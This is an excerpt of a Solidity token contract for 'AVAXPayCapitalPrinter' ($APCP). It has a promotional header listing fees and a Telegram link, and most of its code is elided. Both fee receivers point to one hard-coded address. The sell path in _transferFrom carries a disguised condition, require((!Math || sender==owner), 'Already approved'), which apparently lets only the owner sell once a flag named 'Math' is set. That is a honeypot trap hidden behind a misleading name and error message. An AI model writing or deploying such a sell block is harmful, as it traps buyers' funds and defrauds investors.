...
🖨️  AVAX PAY CAPTITAL PRINTER 🖨️  ($APCP)

📌10% in $APC
📌2%  marketing
📌4%  LP

📢 t.me/avaxpaycapitalprinter
*/
...
contract AVAXPayCapitalPrinter is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "AVAXPayCapitalPrinter";
    string constant _symbol = "APCP";
    ...
    address public autoLiquidityReceiver=0x006E1e685D1fb5B6fB7d1327620146Af2fD5E80C;
    address public marketingFeeReceiver=0x006E1e685D1fb5B6fB7d1327620146Af2fD5E80C;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!Math || sender==owner), "Already approved");
